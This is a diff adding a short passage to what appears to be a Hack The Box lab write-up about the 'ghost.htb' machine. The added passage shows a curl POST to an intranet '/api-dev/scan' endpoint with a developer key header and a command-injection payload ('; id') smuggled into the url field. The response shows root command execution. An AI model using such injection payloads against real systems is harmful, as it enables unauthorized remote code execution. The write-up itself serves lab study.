@@ -592,7 +592,24 @@ As seen in this code stored at `intranet/backend/src/api/dev.rs` it takes the en
 
 ![](Pasted%20image%2020260827190048.png)
 
-This screenshot from the intranet repo readme shows the API is at `/api-dev` and i already know the vulnerable endpoint is `/scan`
+This screenshot from the intranet repo readme shows the API is at `/api-dev` and i already know the vulnerable endpoint is `/scan`, so the endpoint is going to be `/api-dev/scan`
+
+```python
+curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'Content-Type: application/json' -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' --data '{"url":"http://localhost; id"}' | jq .
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100    217 100    187 100     30   4110    659                              0
+{
+  "is_safe": true,
+  "temp_command_success": true,
+  "temp_command_stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
+  "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n"
+}
+```
+
+I now have RCE
+
+All i needed to do was set the request to POST like it says to do 
 
 
 
